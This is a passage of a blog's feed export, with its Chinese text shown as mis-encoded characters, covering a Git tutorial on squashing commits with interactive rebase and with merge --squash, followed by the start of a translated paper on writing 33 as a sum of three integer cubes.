çš„ï¼Œä»æœ€æ—©çš„ <code>Y1</code> å¼€å§‹ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pick 61b5ff9 Y1</span><br><span class="line">pick fb3a5cf Y2</span><br><span class="line">pick b54cd87 Y3</span><br><span class="line">pick 740e7d2 Y4</span><br><span class="line">pick 392dc11 Y5</span><br></pre></td></tr></table></figure><p>å¯¹åº”éœ€è¦åˆå¹¶çš„æäº¤ï¼Œå°†<code>pick</code>æ”¹æˆ<code>squash</code>ï¼ˆæˆ–è€…ç®€åŒ–ä¸º<code>s</code>ï¼‰ï¼Œä¿®æ”¹ä¹‹åä¸ºï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pick 61b5ff9 Y1</span><br><span class="line">s fb3a5cf Y2</span><br><span class="line">s b54cd87 Y3</span><br><span class="line">s 740e7d2 Y4</span><br><span class="line">s 392dc11 Y5</span><br></pre></td></tr></table></figure><p>ä¿å­˜å¹¶å…³é—­ç¼–è¾‘å™¨ï¼Œè¿™æ˜¯ç¼–è¾‘å™¨ä¼šè‡ªåŠ¨è·³å‡ºå¹¶éœ€è¦ä½ æäº¤ä¸€ä¸ªæ–°çš„æäº¤ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This is a combination of 5 commits.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This is the 1st commit message:</span></span><br><span class="line"></span><br><span class="line">Y1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This is the commit message <span class="comment">#2:</span></span></span><br><span class="line"></span><br><span class="line">Y2</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This is the commit message <span class="comment">#3:</span></span></span><br><span class="line"></span><br><span class="line">Y3</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This is the commit message <span class="comment">#4:</span></span></span><br><span class="line"></span><br><span class="line">Y4</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This is the commit message <span class="comment">#5:</span></span></span><br><span class="line"></span><br><span class="line">Y5</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Please enter the commit message <span class="keyword">for</span> your changes. Lines starting</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">with <span class="string">&#x27;#&#x27;</span> will be ignored, and an empty message aborts the commit.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Date:      Thu May 9 13:45:03 2019 +0800</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># interactive rebase in progress; onto 220e45c</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Last commands <span class="keyword">done</span> (5 commands <span class="keyword">done</span>):</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   squash 740e7d2 Y4</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   squash 392dc11 Y5</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">No commands remaining.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">You are currently rebasing branch <span class="string">&#x27;featureY&#x27;</span> on <span class="string">&#x27;220e45c&#x27;</span>.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Changes to be committed:</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   new file:   featY</span></span><br><span class="line"><span class="meta prompt_">#</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼ŒGitæä¾›äº†è¯¦ç»†çš„ä¿¡æ¯æŒ‡å¯¼æäº¤ï¼Œåªéœ€è¦ä¿®æ”¹æˆä½ éœ€è¦çš„ä¿¡æ¯å³å¯ï¼Œæ¯”å¦‚ <code>featureY</code>ï¼Œç„¶åä¿å­˜ã€‚è¿™æ—¶å°±å®Œæˆäº†ä¿®æ”¹ï¼Œä¿®æ”¹ä¹‹åçš„æäº¤ä¿¡æ¯å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git lg</span></span><br><span class="line">* 1b07941 - (HEAD -&gt; featureY) featureY (3 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* 220e45c - (master) feature X (36 minutes ago) &lt;qiwihui&gt;</span><br></pre></td></tr></table></figure><h2><span id="merge-squash">Merge Squash</span></h2><p>ç”¨äºåœ¨åˆå¹¶åˆ†æ”¯æ—¶ï¼Œæœ€ååªåœ¨åˆå¹¶åçš„åˆ†æ”¯ä¸Šä¿ç•™ä¸€ä¸ªæäº¤ã€‚åŒæ ·ä»¥ä¸Šé¢çš„ä»£ç æäº¤ä¸ºä¾‹å­ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git lg</span></span><br><span class="line">* 392dc11 - (HEAD -&gt; featureY) Y5 (5 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* 740e7d2 - Y4 (5 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* b54cd87 - Y3 (5 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* fb3a5cf - Y2 (6 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* 61b5ff9 - Y1 (6 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* 220e45c - (master) feature X (7 minutes ago) &lt;qiwihui&gt;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git checkout master</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git merge --squash featureY</span>  </span><br><span class="line">Updating 220e45c..392dc11</span><br><span class="line">Fast-forward</span><br><span class="line">Squash commit -- not updating HEAD</span><br><span class="line"> featY | 5 +++++</span><br><span class="line"> 1 file changed, 5 insertions(+)</span><br><span class="line"> create mode 100644 featY</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œåˆ†æ”¯<code>featureY</code>ä¿æŒä¸å˜ï¼ŒåŒæ—¶åœ¨<code>master</code>ä¸Šå¤šäº†ä¸€ä¸ªæœªè¢«æäº¤çš„æ›´æ”¹ï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/57431740-503e4680-7266-11e9-88d3-a9a0cb3fb7a5.png" alt="git-merge-squash"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git status</span></span><br><span class="line">On branch master</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage)</span><br><span class="line"></span><br><span class="line">        new file:   featY</span><br></pre></td></tr></table></figure><p>è¿™äº›æ›´æ”¹æ˜¯åˆ†æ”¯<code>featureY</code>ä¸­æ‰€æœ‰æäº¤çš„åˆå¹¶ï¼Œç°åœ¨åªéœ€è¦æäº¤è¿™äº›æ›´æ”¹å°±å¯ä»¥äº†ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git commit -m &quot;featureY&quot;</span><br></pre></td></tr></table></figure><h2><span id="qu-bie">åŒºåˆ«</span></h2><p>ä»ä»¥ä¸Šçš„æ“¦åè¿‡ç¨‹å¯ä»¥çœ‹å‡ºä¸¤è€…ä¹‹é—´çš„å·®åˆ«ï¼šRebase Squashä¼šåˆå¹¶ä¹‹å‰çš„æäº¤ï¼Œä¹‹å‰çš„è®°å½•ä¼šæ¶ˆå¤±ï¼Œè€ŒMerge Squashåªä¼šåœ¨åˆå¹¶çš„åˆ†æ”¯ä¸Šæ–°ç”Ÿæˆæäº¤ï¼ŒåŸæ¥çš„é‚£äº›æäº¤ç†¬è¿˜ä¼šä¿ç•™ã€‚</p><h2><span id="duo-shuo-yi-dian">å¤šè¯´ä¸€ç‚¹</span></h2><p>å¦‚æœéœ€è¦åˆå¹¶çš„æäº¤æ•°é‡å¾ˆå¤šï¼Œæ•°æ•°å®¹æ˜“å‡ºé”™ï¼Œå¯ä»¥ä½¿ç”¨æäº¤å“ˆå¸Œæ¥è¯†åˆ«ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git rebase --interactive [commit-hash]</span><br></pre></td></tr></table></figure><p>è¿™ä¸ª<code>[commit-hash]</code>æ˜¯<em>éœ€è¦åˆå¹¶çš„æäº¤ä¹‹å‰çš„ä¸€ä¸ªæäº¤</em>ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git lg</span></span><br><span class="line">* 392dc11 - (HEAD -&gt; featureY) Y5 (5 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* 740e7d2 - Y4 (5 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* b54cd87 - Y3 (5 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* fb3a5cf - Y2 (6 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* 61b5ff9 - Y1 (6 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* 220e45c - (master) feature X (7 minutes ago) &lt;qiwihui&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œï¼Œéœ€è¦ä½¿ç”¨ <code>220e45c</code> è€Œä¸æ˜¯ <code>61b5ff9</code>ã€‚</p><h2><span id="can-kao">å‚è€ƒ</span></h2><ul><li><a href="https://www.internalpointers.com/post/squash-commits-into-one-git">Squash commits into one with Git</a></li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Gitåˆå¹¶æäº¤
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
  </entry>
  
  <entry>
    <title>è§£å†³33é—®é¢˜â”€â”€å°†33å†™æˆ3ä¸ªæ•´æ•°çš„ç«‹æ–¹å’Œ</title>
    <link href="https://qiwihui.com/qiwihui-blog-61/"/>
    <id>https://qiwihui.com/qiwihui-blog-61/</id>
    <published>2019-09-04T01:20:40.000Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ç¯‡æ–‡ç« å†…å®¹ç¿»è¯‘è‡ªè®ºæ–‡ <a href="https://arxiv.org/abs/1903.04284">Cracking the problem with 33</a>ï¼Œè®ºæ–‡ç ”ç©¶äº†æ–¹ç¨‹ $x^3+y^3+z^3=k$ åœ¨ä¸€äº›å°çš„ $k$ å€¼çš„è§£ï¼Œå¹¶é¦–æ¬¡å°†33å†™æˆäº†3ä¸ªæ•´æ•°çš„ç«‹æ–¹å’Œã€‚å®Œæˆä¸­æ–‡å¯ä»¥æŸ¥çœ‹é¡¹ç›® <a href="https://github.com/qiwihui/cracking-the-problem-with-33">qiwihui/cracking-the-problem-with-33</a>ã€‚æˆªæ­¢åˆ°ç›®å‰ï¼Œ100ä»¥å†…çš„è‡ªç„¶æ•°å°±å‰©ä¸‹42è¿˜æ²¡æœ‰æ‰¾åˆ°å…³äºç«‹æ–¹å’Œçš„æ•´æ•°è§£äº†ï¼</p><blockquote><p>Answer to the Ultimate Question of Life, the Universe, and Everything. â€“ 42</p></blockquote><span id="more"></span><p>ä»¥ä¸‹æ˜¯è®ºæ–‡æ­£æ–‡ç¿»è¯‘ï¼š</p><hr><h1><span id="jie-jue-33-wen-ti">è§£å†³33é—®é¢˜</span></h1><p>ä½œè€…ï¼šANDREW R. BOOKER</p><p><strong>æ‘˜è¦</strong> å—åˆ°Tim Browningå’ŒBrady Harançš„<a href="https://www.youtube.com/channel/UCoxcjq-8xIDTYp3uz647V5A">Numberphile</a>è§†é¢‘&quot;<a href="https://www.youtube.com/watch?v=wymmCdLdPvM">æœªè§£å†³çš„33é—®é¢˜</a>&quot;çš„å¯å‘ï¼Œæˆ‘ä»¬ç ”ç©¶äº†æ–¹ç¨‹ $x^3+y^3+z^3=k$ åœ¨ä¸€äº›å°çš„ $k$ å€¼çš„è§£ã€‚ æˆ‘ä»¬æ‰¾åˆ°äº† $k=33$çš„ç¬¬ä¸€ä¸ªå·²çŸ¥è§£ã€‚</p><h2><span id="1-jian-jie">1. ç®€ä»‹</span></h2><p>ä»¤ $k$ ä¸ºæ­£æ•´æ•°ï¼Œå…¶ä¸­ $k \equiv Â±4(\mod 9)$ã€‚ ç„¶åHeath-Brown<a href="#HB92">[HB92]</a> æ¨æµ‹ æœ‰æ— é™å¤šçš„ä¸‰å…ƒç»„$(xï¼Œyï¼Œz) \in \mathbb{Z}^3$ æ»¡è¶³</p><p>$$k = x^3 + y^3 + z^3. \quad \text{(1)}$$</p><p>æ—©åœ¨1954å¹´å°±å¼€å§‹å¯¹ï¼ˆ1ï¼‰è¿›è¡Œå„ç§æ•°å€¼ç ”ç©¶<a href="#MW55">[MW55]</a>ï¼›è¯·å‚é˜…<a href="#BPTYJ07">[BPTYJ07]</a>ï¼Œäº†è§£æˆªè‡³2000å¹´çš„è¿™äº›ç ”ç©¶çš„å†å²ã€‚è‡ªé‚£æ—¶èµ·è¿›è¡Œçš„è®¡ç®—ç”±äºElkies <a href="#Elk00">[Elk00]</a>è€Œè¢«ç®—æ³•æ‰€ä¸»å¯¼ã€‚æˆ‘ä»¬æ‰€çŸ¥é“çš„æœ€æ–°å†…å®¹æ˜¯Huisman<a href="#Hui16">[Hui16]</a> çš„è®ºæ–‡ï¼Œ è¯¥è®ºæ–‡ç¡®å®šäº†ï¼ˆ1ï¼‰çš„æ‰€æœ‰è§£ï¼Œå…¶ä¸­$k \le 1000$ ä¸” $\max{|x|,|y|,|z|}\le 10^15$ã€‚ç‰¹åˆ«æ˜¯ï¼ŒHuismanæŠ¥å‘Šè¯´é™¤äº†13ä¸ª $k \le 1000$çš„å€¼ä»¥å¤–çš„æ‰€æœ‰è§£å†³æ–¹æ¡ˆéƒ½æ˜¯å·²çŸ¥çš„ï¼š</p><p>$$33, 42, 114, 165, 390, 579, 627, 633, 732, 795, 906, 921, 975. \quad \text{(2)}$$</p><p>Elkiesçš„ç®—æ³•é€šè¿‡ä½¿ç”¨æ ¼åŸºå‡å°‘ï¼ˆlattice basis reductionï¼‰åœ¨Fermatæ›²çº¿$X^3+Y^3=1$ é™„è¿‘å¯»æ‰¾æœ‰ç†ç‚¹æ¥å·¥ä½œï¼›å®ƒéå¸¸é€‚åˆåŒæ—¶æ‰¾åˆ°è®¸å¤š $k$ å€¼çš„è§£ã€‚åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬æè¿°äº†ä¸€ç§åœ¨kå€¼ç¡®å®šæ—¶æ›´æœ‰æ•ˆçš„ä¸åŒæ–¹æ³•ã€‚å®ƒçš„ä¼˜ç‚¹æ˜¯å¯ä»¥æ‰¾åˆ°æ‰€æœ‰å…·æœ‰ <em>æœ€å°</em>åæ ‡ç•Œé™çš„è§£ï¼Œè€Œä¸æ˜¯Elkiesç®—æ³•ä¸­çš„æœ€å¤§åæ ‡ã€‚è¿™æ€»æ˜¯äº§ç”Ÿæœç´¢èŒƒå›´çš„éå¹³å‡¡çš„æ‰©å¼ ï¼ˆnontrivialexpansionï¼‰ï¼Œå› ä¸ºé™¤äº†å¯ä»¥å•ç‹¬è€ƒè™‘çš„æœ‰é™å¤šä¸ªä¾‹å¤–ä¹‹å¤–ï¼Œè¿˜æœ‰</p><p>$$\max {|x|,|y|,|z|} &gt; \sqrt[3]{2} \min {|x|,|y|,|z|}$$</p><p>æ­¤å¤–ï¼Œæ ¹æ®ç»éªŒï¼Œé€šå¸¸æƒ…å†µæ˜¯å…¶ä¸­ä¸€ä¸ªå˜é‡æ¯”å…¶ä»–å˜é‡å°å¾—å¤šï¼Œå› æ­¤æˆ‘ä»¬å¸Œæœ›å®é™…ä¸Šå¢ç›Šæ›´å¤§ã€‚</p><p>æˆ‘ä»¬çš„ç­–ç•¥ç±»ä¼¼äºä¸€äº›æ—©æœŸçš„æ–¹æ³•ï¼ˆç‰¹åˆ«å‚è§<a href="#HBLtR93">[HBLtR93]</a>ï¼Œ<a href="#Bre95">[Bre95]</a>ï¼Œ<a href="#KTS97">[KTS97]</a>å’Œ <a href="#BPTYJ07">[BPTYJ07]</a>ï¼‰ï¼Œ å¹¶ä¸”åŸºäºè§‚å¯Ÿï¼š$k-z^3=x^3+y^3$çš„ä»»ä½•è§£éƒ½å…·æœ‰ $x+y$ ä½œä¸ºä¸€ä¸ªå› å­ã€‚ç›¸å¯¹äºæ—©æœŸç ”ç©¶ï¼Œæˆ‘ä»¬çš„ä¸»è¦è´¡çŒ®æ˜¯æ³¨æ„åˆ°ï¼Œé€šè¿‡ä¸€äº›æ—¶é—´ç©ºé—´æƒè¡¡ï¼Œè¿è¡Œæ—¶é—´åœ¨é«˜åº¦è¾¹ç•Œå†…éå¸¸æ¥è¿‘çº¿æ€§ï¼Œå¹¶ä¸”åœ¨ç°ä»£64ä½è®¡ç®—æœºä¸Šå®ç°æ—¶éå¸¸å®ç”¨ã€‚</p><p>æ›´è¯¦ç»†åœ°è¯´ï¼Œå‡è®¾ $(xï¼Œyï¼Œz)$ æ˜¯ï¼ˆ1ï¼‰çš„è§£ï¼Œå¹¶ä¸”ä¸å¤±ä¸€èˆ¬æ€§ï¼Œå‡è®¾$|x| \ge |y| \ge |z|$ã€‚ ç„¶åæˆ‘ä»¬æœ‰</p><p>$$k-z^{3}=x^{3}+y^{3}=(x+y)(x^{2}-x y+y^{2})$$</p><p>å¦‚æœ $k-z^3=0$ åˆ™ $y=-x$ï¼Œå¹¶ä¸” $x$ çš„æ¯ä¸ªå€¼éƒ½äº§ç”Ÿä¸€ä¸ªè§£ã€‚ å¦åˆ™ï¼Œè®¾$d=|x+y|=|x|+y \operatorname{sgn} x$ï¼Œ æˆ‘ä»¬çœ‹åˆ° $d$ å¯ä»¥é™¤ $|k-z^3|$å¹¶ä¸”</p><p>$$\begin{aligned}\begin{aligned}\frac{\left|k-z^{3}\right|}{d} &amp;=x^{2}-x y+y^{2}=x(2 x-(x+y))+y^{2} \&amp;=|x|(2|x|-d)+(d-|x|)^{2}=3 x^{2}-3 d|x|+d^{2}\end{aligned}\end{aligned}$$</p><p>å¾—åˆ°</p><p>$${x, y}=\left{\frac{1}{2} \operatorname{sgn}\left(k-z^{3}\right)\left(d \pm \sqrt{\frac{4|k-z^{3}|-d^{3}}{3 d}}\right)\right}$$</p><p>å› æ­¤ï¼Œç»™å®š $z$ çš„å€™é€‰å€¼ï¼Œé€šè¿‡éå† $|k-z^3|$ çš„æ‰€æœ‰é™¤æ•°ï¼Œæœ‰ä¸€ä¸ªæœ‰æ•ˆçš„ç¨‹åºæ¥æŸ¥æ‰¾ $x$ å’Œ $y$ çš„æ‰€æœ‰ç›¸åº”å€¼ã€‚è¿™ä¸ªåŸºæœ¬ç®—æ³•åœ¨å‡è®¾æ•´æ•°åˆ†è§£çš„æ—¶é—´å¤æ‚åº¦çš„æ ‡å‡†å¯å‘å¼ï¼ˆstandardheuristicsï¼‰ä¸‹ï¼Œå·²ç»èƒ½åœ¨ æ—¶é—´ $O(B^{1+\varepsilon})$ å†…æ‰¾åˆ°æ»¡è¶³$\min{|x|,|y|,|z|}\ge B$ çš„æ‰€æœ‰è§£ã€‚åœ¨ä¸‹ä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†è§£é‡Šå¦‚ä½•é¿å…å› å­åˆ†è§£å¹¶æ›´æœ‰æ•ˆåœ°å®ç°ç›¸åŒç›®çš„ã€‚</p><p><strong>æ„Ÿè°¢</strong> æ„Ÿè°¢Roger Heath-Brownæä¾›äº†æœ‰ç”¨çš„æ„è§å’Œå»ºè®®ã€‚</p><h2><span id="2-fang-fa">2. æ–¹æ³•</span></h2><p>ä¸ºäº†ä¾¿äºè¡¨ç¤ºï¼Œæˆ‘ä»¬å‡è®¾$k \equiv Â±3(\mod 9)$ï¼›è¯·æ³¨æ„ï¼Œè¿™é€‚ç”¨äºï¼ˆ2ï¼‰ä¸­çš„æ‰€æœ‰ $k$ã€‚ç”±äºä¸Šè¿°åŸºæœ¬ç®—æ³•å¯¹äºå¯»æ‰¾å°è§£æ˜¯åˆç†çš„ï¼Œå› æ­¤æˆ‘ä»¬å°†å‡è®¾ $|z|&gt;\sqrt{k}$ã€‚æ­¤å¤–ï¼Œå¦‚æœæˆ‘ä»¬å°†ï¼ˆ1ï¼‰ä¸“é—¨ç”¨äº $y=z$ çš„è§£ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¾—åˆ°Thueæ–¹ç¨‹$x^3+2y^3=k$ï¼Œè¿™æ˜¯æœ‰æ•ˆå¯è§£çš„ã€‚ ä½¿ç”¨ PARI/GP<a href="#The18">[The18]</a> ä¸­çš„Thueæ±‚è§£å™¨ï¼Œæˆ‘ä»¬éªŒè¯äº†ï¼ˆ2ï¼‰ä¸­çš„ $k$ä¸å­˜åœ¨è¿™æ ·çš„è§£ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥å‡è®¾ $y \ne z$ã€‚</p><p>ç”±äº $|z|&gt;\sqrt{k} \ge \sqrt[3]{k}$ï¼Œæˆ‘ä»¬æœ‰</p><p>$$\operatorname{sgn} z=-\operatorname{sgn}(k-z^{3})=-\operatorname{sgn}(x^{3}+y^{3})=-\operatorname{sgn} x.$$</p><p>åŒæ ·ï¼Œå› ä¸º $x^3 + z^3 = k-y^3$ å’Œ $|y|\ge |z|$ï¼Œ æˆ‘ä»¬æœ‰$\operatorname{sgn} y=-\operatorname{sgn} x=\operatorname{sgn} z$ã€‚å°†ï¼ˆ1ï¼‰çš„ä¸¤è¾¹ä¹˜ä»¥ $-\operatorname{sgn} z$ï¼Œæˆ‘ä»¬å¾—åˆ°</p><p>$$|x|^{3}-|y|^{3}-|z|^{3}=-k \operatorname{sgn} z \quad \text{(4)}$$</p><p>ä»¤ $\alpha=\sqrt[3]{2}-1$ï¼Œå¹¶ä¸” $d=|x+y|=|x|-|y|$ã€‚ å¦‚æœ$d \ge \alpha |z|$ åˆ™</p><p>$$\begin{aligned}\begin{aligned}-k \operatorname{sgn} z &amp;=|x|^{3}-|y|^{3}-|z|^{3} \geq(|y|+\alpha|z|)^{3}-|y|^{3}-|z|^{3} \&amp;=3 \alpha(\alpha+2)(|y|-|z|) z^{2}+3 \alpha(|y|-|z|)^{2}|z| \&amp; \geq 3 \alpha(\alpha+2)|y-z| z^{2}\end{aligned}\end{aligned}$$</p><p>ç”±äº $3 \alpha(\alpha+2)&gt;1$ï¼Œ è¿™ä¸æˆ‘ä»¬çš„å‡è®¾ä¸ç›¸å®¹ï¼Œå³ $y \ne z$ å’Œ$|z|&gt;\sqrt{k}$ã€‚ å› æ­¤æˆ‘ä»¬å¿…ç„¶æœ‰ $0&lt;d&lt;\alpha|z|$ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œå‡å°‘ï¼ˆ4ï¼‰æ¨¡3å¹¶å›æƒ³æˆ‘ä»¬çš„å‡è®¾ $k \equiv Â±3(\mod 9)$ï¼Œæˆ‘ä»¬æœ‰</p><p>$$d=|x|-|y| \equiv|z| \quad(\mod 3).$$</p><p>è®¾ $\epsilon\in{Â±1}$ ä½¿å¾— $k \equiv 3 \epsilon(\mod 9)$ã€‚ç„¶åï¼Œç”±äºæ¯ä¸ªç«‹æ–¹æ•°éƒ½ä¸ $0$ æˆ– $Â±1(mod 9)$ ç›¸ç­‰ï¼Œ æˆ‘ä»¬å¿…ç„¶æœ‰$x \equiv y \equiv z \equiv \epsilon(\mod 3)$ï¼Œ å› æ­¤$\operatorname{sgn} z=\epsilon(\frac{|z|}{3})=\epsilon(\frac{d}{3})$ã€‚åŸºäºï¼ˆ3ï¼‰ï¼Œå½“ä¸”ä»…å½“ $d | z^{3}-k$ ä»¥åŠ$3d(4|z^{3}-k|-d^3) = 3d(4\epsilon(\frac{d}{3})(z^{3}-k)-d^{3})$æ˜¯å¹³æ–¹æ•°æ—¶ï¼Œ æˆ‘ä»¬å¾—åˆ°ï¼ˆ1ï¼‰çš„è§£ã€‚</p><p>æ€»ä¹‹ï¼Œæ‰¾åˆ°ï¼ˆ1ï¼‰çš„æ‰€æœ‰è§£å¹¶ä¸”æ»¡è¶³$|x| \ge |y| \ge |z|&gt;\sqrt{k}$ï¼Œ$y \ne z$ å’Œ$|z|\le B$ï¼Œå¯¹äºæ¯ä¸ªä¸3äº’è´¨çš„ $d\in\mathbb{Z}\cap(0,\alpha B)$ï¼Œè§£å†³ä»¥ä¸‹ç³»ç»Ÿå°±è¶³å¤Ÿäº†ï¼š</p><p>$$\begin{aligned}\begin{aligned}&amp;{\frac{d}{\sqrt[3]{2}-1}&lt;|z| \le B, \quad \operatorname{sgn} z=\epsilon\left(\frac{d}{3}\right), \quad z^{3} \equiv k \quad(\mod d)} \&amp;{3 d\left(4 \epsilon\left(\frac{d}{3}\right)(z^{3}-k)-d^{3}\right)=\square} &amp; \text{(5)}\end{aligned}\end{aligned}$$</p><p>æˆ‘ä»¬è§£å†³è¿™ä¸ªé—®é¢˜çš„æ–¹æ³•å¾ˆç®€å•ï¼šæˆ‘ä»¬é€šè¿‡å®ƒä»¬çš„ä¸»è¦å› å­åˆ†è§£é€’å½’åœ°è®¡ç®— $d$çš„å€¼ï¼Œ å¹¶åº”ç”¨ä¸­å›½å‰©ä½™å®šç†æ¥å°† $z^{3} \equiv k(\mod d)$çš„è§£å‡å°‘åˆ°ç´ æ•°æ¨¡å¹‚çš„æƒ…å†µä¸‹ï¼Œ å…¶ä¸­æ ‡å‡†ç®—æ³•å¯ä»¥é€‚ç”¨ã€‚è®¾$r_{d}(k)=# \left{z(\mod d):z^{3} \equiv k(\mod d)\right}$ è¡¨ç¤º $k$ æ¨¡ $d$çš„ç«‹æ–¹æ ¹æ•°ã€‚é€šè¿‡æ ‡å‡†åˆ†æä¼°è®¡ï¼Œç”±äº $k$ ä¸æ˜¯ç«‹æ–¹æ•°ï¼Œæˆ‘ä»¬æœ‰</p><p>$$\sum_{d \le \alpha B} r_{d}(k) \ll_{k} B$$</p><p>å¯å‘å¼åœ°ï¼Œè®¡ç®—å¯¹æ‰€æœ‰ç´ æ•° $p\le \alpha B$ çš„ $z^{3} \equiv k(\mod p)$çš„è§£ å¯ä»¥ç”¨ $[0, \alpha B]$ ä¸Šçš„æ•´æ•°åœ¨ $O(B)$ ç®—æœ¯è¿ç®—æ¥å®Œæˆï¼› è§ä¾‹å¦‚[<a href="#NZM91">[NZM91]</a>ï¼ŒÂ§2.9ï¼Œç»ƒä¹ 8]ä¸­æè¿°çš„ç®—æ³•ã€‚å‡è®¾è¿™ä¸€ç‚¹ï¼Œå¯ä»¥çœ‹å‡ºï¼Œä½¿ç”¨Montgomeryçš„æ‰¹é‡åè½¬æŠ€å·§[<a href="#Mon87">[Mon87]</a>ï¼ŒÂ§10.3.1]ï¼Œè®¡ç®—å¯¹æ‰€æœ‰æ­£æ•´æ•°$p\le \alpha B$ çš„ $z^{3} \equiv k(\mod p)$ çš„æ ¹çš„å‰©ä½™å·¥ä½œå¯ä»¥å†æ¬¡ç”¨$O(B)$ ç®—æœ¯è¿ç®—å®Œæˆã€‚</p><p>å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨çº¿æ€§æ—¶é—´å†…è®¡ç®—æ»¡è¶³ï¼ˆ5ï¼‰çš„ç¬¬ä¸€è¡Œçš„æ‰€æœ‰ $z$ï¼Œä½œä¸ºç®—æœ¯è¿›å±•ï¼ˆarithmeticprogressionsï¼‰çš„å¹¶é›†ã€‚ä¸ºäº†æ£€æµ‹æœ€åä¸€è¡Œçš„è§£ï¼Œæœ‰ä¸€ä¸ªå¿«é€Ÿçš„æ–¹æ³•æ¥ç¡®å®š$\Delta :=3d\left(4\epsilon(\frac{d}{3})(z^{3}-k)-d^{3}\right)$æ˜¯ä¸€ä¸ªå¹³æ–¹æ•° è‡³å…³é‡è¦ã€‚æˆ‘ä»¬é¦–å…ˆæ³¨æ„åˆ°å¯¹äºå›ºå®š$d$ï¼Œè¿™ç§æƒ…å†µå‡å°‘åˆ°åœ¨æ¤­åœ†æ›²çº¿ä¸Šæ‰¾åˆ°ç§¯åˆ†ç‚¹ï¼› ç‰¹åˆ«æ˜¯ï¼Œä»¤ $X=12d|z|$ å’Œ$Y=(6d^2|x-y|$ï¼Œä»ï¼ˆ3ï¼‰ä¸­æˆ‘ä»¬çœ‹åˆ°ï¼ˆXï¼ŒYï¼‰ä½äºMordellæ›²çº¿ä¸Š</p><p>$$Y^{2}=X^{3}-2(6 d)^{3}\left(d^{3}+4 \epsilon\left(\frac{d}{3}\right) k\right). \quad \text{(6)}$$</p><p>å› æ­¤ï¼Œå¯¹äºå›ºå®š $d$ï¼Œå­˜åœ¨è‡³å¤šæœ‰é™å¤šä¸ªè§£ï¼Œå¹¶ä¸”å®ƒä»¬å¯ä»¥è¢«æœ‰æ•ˆåœ°çº¦æŸã€‚ 